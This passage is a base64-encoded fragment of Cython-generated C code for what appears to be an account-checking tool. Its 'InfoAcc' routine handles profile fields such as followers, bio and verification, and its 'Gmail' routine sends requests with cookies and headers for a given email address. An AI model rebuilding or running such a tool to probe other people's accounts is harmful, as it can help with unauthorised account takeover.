wdGlvbigmX19weXhfdF8xOSwgJl9fcHl4X3RfMTgsICZfX3B5eF90XzE3KSA8IDApIF9fUFlYX0VSUigwLCAyODAsIF9fcHl4X0wzOV9leGNlcHRfZXJyb3IpCiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTkpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE4KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNyk7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xOCk7CiAgICAgICAgICBfX3B5eF92X2UgPSBfX3B5eF90XzE4OwogICAgICAgICAgIHsKCiAgICAgICAgICAgIAogICAgICAgICAgICBfX3B5eF90XzE1ID0gTlVMTDsKICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogICAgICAgICAgICBfX3B5eF90XzE2ID0gX19weXhfYnVpbHRpbl9wcmludDsgCiAgICAgICAgICAgIF9fcHl4X3RfNSA9IDE7CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X293fTsKICAgICAgICAgICAgICBfX3B5eF90XzIxID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xNiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMi1fX3B5eF90XzUpIHwgKF9fcHl4X3RfNSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwOwogICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yMSkpIF9fUFlYX0VSUigwLCAyODEsIF9fcHl4X0w0OF9lcnJvcikKICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDsKICAgICAgICAgIH0KCiAgICAgICAgICAKICAgICAgICAgICB7CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDsKICAgICAgICAgICAgICBnb3RvIF9fcHl4X0w0OTsKICAgICAgICAgICAgfQogICAgICAgICAgICBfX3B5eF9MNDhfZXJyb3I6OwogICAgICAgICAgICB7CiAgICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgICAgICAgICBfX3B5eF90XzI5ID0gMDsgX19weXhfdF8zMCA9IDA7IF9fcHl4X3RfMzEgPSAwOyBfX3B5eF90XzMyID0gMDsgX19weXhfdF8zMyA9IDA7IF9fcHl4X3RfMzQgPSAwOwogICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7CiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU3dhcCgmX19weXhfdF8zMiwgJl9fcHl4X3RfMzMsICZfX3B5eF90XzM0KTsKICAgICAgICAgICAgICBpZiAoIHVubGlrZWx5KF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8yOSwgJl9fcHl4X3RfMzAsICZfX3B5eF90XzMxKSA8IDApKSBfX1B5eF9FcnJGZXRjaCgmX19weXhfdF8yOSwgJl9fcHl4X3RfMzAsICZfX3B5eF90XzMxKTsKICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjkpOwogICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zMCk7CiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMxKTsKICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMzIpOwogICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zMyk7CiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzM0KTsKICAgICAgICAgICAgICBfX3B5eF90XzI2ID0gX19weXhfbGluZW5vOyBfX3B5eF90XzI3ID0gX19weXhfY2xpbmVubzsgX19weXhfdF8yOCA9IF9fcHl4X2ZpbGVuYW1lOwogICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X2UpOyBfX3B5eF92X2UgPSAwOwogICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMyKTsKICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMzKTsKICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzM0KTsKICAgICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzMyLCBfX3B5eF90XzMzLCBfX3B5eF90XzM0KTsKICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzI5KTsKICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMwKTsKICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMxKTsKICAgICAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlKF9fcHl4X3RfMjksIF9fcHl4X3RfMzAsIF9fcHl4X3RfMzEpOwogICAgICAgICAgICAgIF9fcHl4X3RfMjkgPSAwOyBfX3B5eF90XzMwID0gMDsgX19weXhfdF8zMSA9IDA7IF9fcHl4X3RfMzIgPSAwOyBfX3B5eF90XzMzID0gMDsgX19weXhfdF8zNCA9IDA7CiAgICAgICAgICAgICAgX19weXhfbGluZW5vID0gX19weXhfdF8yNjsgX19weXhfY2xpbmVubyA9IF9fcHl4X3RfMjc7IF9fcHl4X2ZpbGVuYW1lID0gX19weXhfdF8yODsKICAgICAgICAgICAgICBnb3RvIF9fcHl4X0wzOV9leGNlcHRfZXJyb3I7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgX19weXhfTDQ5OjsKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE4KTsgX19weXhfdF8xOCA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDsKICAgICAgICAgIGdvdG8gX19weXhfTDM4X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgICAgIH0KICAgICAgICBnb3RvIF9fcHl4X0wzOV9leGNlcHRfZXJyb3I7CgogICAgICAgIAogICAgICAgIF9fcHl4X0wzOV9leGNlcHRfZXJyb3I6OwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yMyk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yNCk7CiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzIzLCBfX3B5eF90XzI0KTsKICAgICAgICBnb3RvIF9fcHl4X0wzMV9lcnJvcjsKICAgICAgICBfX3B5eF9MMzhfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yMyk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yNCk7CiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzIzLCBfX3B5eF90XzI0KTsKICAgICAgICBfX3B5eF9MNDJfdHJ5X2VuZDo7CiAgICAgIH0KCiAgICAgIAogICAgfQogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIyKTsgX19weXhfdF8yMiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICBnb3RvIF9fcHl4X0wzNl90cnlfZW5kOwogICAgX19weXhfTDMxX2Vycm9yOjsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE4KTsgX19weXhfdF8xOCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwoKICAgIAogICAgIHsKICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZS5JbmZvQWNjIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMTcsICZfX3B5eF90XzE4LCAmX19weXhfdF8xOSkgPCAwKSBfX1BZWF9FUlIoMCwgMjgyLCBfX3B5eF9MMzNfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTcpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTgpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTkpOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMTYgPSBOVUxMOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7CiAgICAgIF9fcHl4X3RfMTUgPSBfX3B5eF9idWlsdGluX3ByaW50OyAKICAgICAgX19weXhfdF81ID0gMTsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzE2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3d9OwogICAgICAgIF9fcHl4X3RfMjEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzE1LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgyLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIxKSkgX19QWVhfRVJSKDAsIDI4MywgX19weXhfTDMzX2V4Y2VwdF9lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMSk7CiAgICAgIH0KICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDsKICAgICAgZ290byBfX3B5eF9MMzJfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICB9CgogICAgCiAgICBfX3B5eF9MMzNfZXhjZXB0X2Vycm9yOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIyKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNik7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzgsIF9fcHl4X3RfMjIsIF9fcHl4X3RfNik7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDMyX2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIyKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNik7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzgsIF9fcHl4X3RfMjIsIF9fcHl4X3RfNik7CiAgICBfX3B5eF9MMzZfdHJ5X2VuZDo7CiAgfQoKICAKCiAgCiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTsKICBnb3RvIF9fcHl4X0wwOwogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE0KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE3KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTgpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTsKICBfX1B5eF9BZGRUcmFjZWJhY2soIm5lLkluZm9BY2MiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX3B5eF9yID0gTlVMTDsKICBfX3B5eF9MMDo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3JyKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfSWQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9mdWxsX25hbWUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9mb3dzKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZm93Zyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3BwKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaXNQcmFpc2UpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9iaW8pOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9pc192ZXJpZmllZCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2JpenopOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9zcyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2ZpbGUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9lKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ybmVfMTFHbWFpbChQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKTsgCnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJuZV8xMUdtYWlsID0geyJHbWFpbCIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMm5lXzExR21haWwsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07CnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm5lXzExR21haWwoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCikgewogIFB5T2JqZWN0ICpfX3B5eF92X2VtYWlsID0gMDsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzOwogICNlbmRpZgogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlczsKICBQeU9iamVjdCogdmFsdWVzWzFdID0gezB9OwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIkdtYWlsICh3cmFwcGVyKSIsIDApOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7CiAgI2Vsc2UKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMOwogICNlbmRpZgogICNlbmRpZgogIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpOwogIHsKICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VtYWlsLDB9OwogICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7CiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDI4NiwgX19weXhfTDNfZXJyb3IpCiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7CiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHsKICAgICAgICBjYXNlICAxOgogICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAyODYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAwOiBicmVhazsKICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgICB9CiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7CiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJHbWFpbCIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMjg2LCBfX3B5eF9MM19lcnJvcikKICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDE7IGkrKykgewogICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiR21haWwiLCAxLCAxLCAxLCBpKTsgX19QWVhfRVJSKDAsIDI4NiwgX19weXhfTDNfZXJyb3IpIH0KICAgICAgfQogICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAxKSkgewogICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgfSBlbHNlIHsKICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAyODYsIF9fcHl4X0wzX2Vycm9yKQogICAgfQogICAgX19weXhfdl9lbWFpbCA9IHZhbHVlc1swXTsKICB9CiAgZ290byBfX3B5eF9MNl9za2lwOwogIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjsKICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiR21haWwiLCAxLCAxLCAxLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCAyODYsIF9fcHl4X0wzX2Vycm9yKQogIF9fcHl4X0w2X3NraXA6OwogIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7CiAgX19weXhfTDNfZXJyb3I6OwogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZS5HbWFpbCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBOVUxMOwogIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjsKICBfX3B5eF9yID0gX19weXhfcGZfMm5lXzEwR21haWwoX19weXhfc2VsZiwgX19weXhfdl9lbWFpbCk7CgogIAogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMm5lXzEwR21haWwoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfZW1haWwpIHsKICBQeU9iamVjdCAqX19weXhfdl9vID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl90bCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfaG9zdCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfY29va2llcyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfaGVhZGVycyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfcGFyYW1zID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9kYXRhID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9yZXNwb25zZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3Zfb2sgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3VzZXJuYW1lID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9nZyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7CiAgaW50IF9fcHl4X3RfNDsKICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF85ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEyID0gTlVMTDsKICBzaXplX3QgX19weXhfdF8xMzsKICBQeU9iamVjdCAqX19weXhfdF8xNCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE2ID0gTlVMTDsKICBQeU9iamVjdCAqKCpfX3B5eF90XzE3KShQeU9iamVjdCAqKTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJHbWFpbCIsIDApOwogIF9fUHl4X0lOQ1JFRihfX3B5eF92X2VtYWlsKTsKCiAgCiAgewogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgX19QeXhfRXhjZXB0aW9u